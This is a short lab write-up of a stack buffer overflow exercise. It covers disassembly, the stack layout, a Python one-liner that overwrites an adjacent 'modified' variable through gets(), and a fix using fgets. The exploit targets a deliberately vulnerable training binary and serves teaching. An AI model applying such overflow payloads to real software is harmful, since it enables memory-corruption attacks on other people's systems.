# ex00 — Stack buffer overflow into adjacent local

Goal: `you have changed the 'modified' variable`

## Assembly (main)

```
sub    esp, 0x60                 ; 96 bytes of locals
mov    DWORD [esp+0x5c], 0x0     ; `modified` = 0
lea    eax, [esp+0x1c]           ; &buffer
mov    [esp], eax
call   gets                       ; VULN: unbounded read into buffer
mov    eax, [esp+0x5c]           ; load `modified`
test   eax, eax                  ; if (modified != 0) win
je     .lose
```

## Stack layout (offsets from esp after `sub esp,0x60`)

```
+---------------+ esp+0x5c  modified (4 bytes)      <- must become != 0
| ...           |
| buffer[64]    | esp+0x1c
+---------------+ esp
```

`modified - buffer = 0x5c - 0x1c = 0x40 = 64 bytes`, so byte 65 of input lands
on the first byte of `modified`.

## Exploit

```bash
python3 -c "print('A'*65)" | ./ex00/bin
```

Output: `you have changed the 'modified' variable`

## Why it works

`gets()` has no length parameter, so it reads until newline. The compiler put
`modified` above `buffer` on the stack, so writing past the buffer clobbers it.
The check is `test eax, eax` — any non-zero value satisfies it, so a single
extra `'A'` is enough.

## Fix

Replace `gets(buf)` with `fgets(buf, sizeof(buf), stdin)`, or better: use a
language / API that carries the buffer length.
